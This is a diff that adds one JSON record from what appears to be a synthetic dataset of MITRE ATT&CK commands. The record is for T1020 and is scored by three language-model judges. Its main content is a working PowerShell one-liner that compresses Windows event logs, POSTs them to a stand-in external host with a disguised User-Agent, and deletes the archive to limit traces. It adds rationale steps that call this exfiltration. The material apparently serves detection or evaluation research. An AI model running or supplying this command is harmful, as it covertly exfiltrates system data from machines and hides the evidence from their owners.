@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$ProgressPreference='SilentlyContinue'; $f=Join-Path $env:TEMP ('evt_'+(Get-Date -Format yyyyMMddHHmmss)+'.zip'); Compress-Archive -Path 'C:\\Windows\\System32\\winevt\\Logs\\System.evtx','C:\\Windows\\System32\\winevt\\Logs\\Application.evtx' -DestinationPath $f -Force; Invoke-WebRequest -Uri 'https://updates-cache.example.org/collect/events' -Method Post -InFile $f -ContentType 'application/zip' -Headers @{ 'User-Agent'='Mozilla/5.0'; 'X-Host'=$env:COMPUTERNAME } -ErrorAction SilentlyContinue; Remove-Item $f -Force",
+  "explanation": "Compresses key event logs and transmits them via HTTPS POST using Invoke-WebRequest with innocuous headers.",
+  "rationale_steps": [
+    "Aggregate multiple event logs into a single archive.",
+    "Exfiltrate using HTTPS POST to appear as normal web traffic.",
+    "Suppress progress and delete temporary files to limit traces."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-ed594729-6c9f09db",
+  "source_prompt_hash": "ed594729",
+  "timestamp_utc": "2025-09-30T09:16:21.768830Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/parentheses, valid cmdlets/parameters, proper hashtable headers, and correct statement separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It automates packaging event logs and exfiltrates them over HTTPS with plausible headers and cleanup, but may fail against in-use/permission-restricted EVTX files and lacks scheduling.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:39:13.600121Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, cmdlet usage, parameter passing, balanced quotes/parentheses/braces, and appropriate semicolons separating each command.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by compressing Windows event logs into a temporary zip file, exfiltrating them via HTTPS POST with disguised headers, and cleaning up the evidence afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:39:16.278534Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses correct PowerShell cmdlet syntax, valid parameters, balanced delimiters, and proper command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves automated exfiltration by compressing specific event logs and transmitting them via HTTPS POST with appropriate headers and cleanup, fully aligning with the T1020 technique description and operational plausibility under the stated 'None' privilege.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:48:43.352202Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
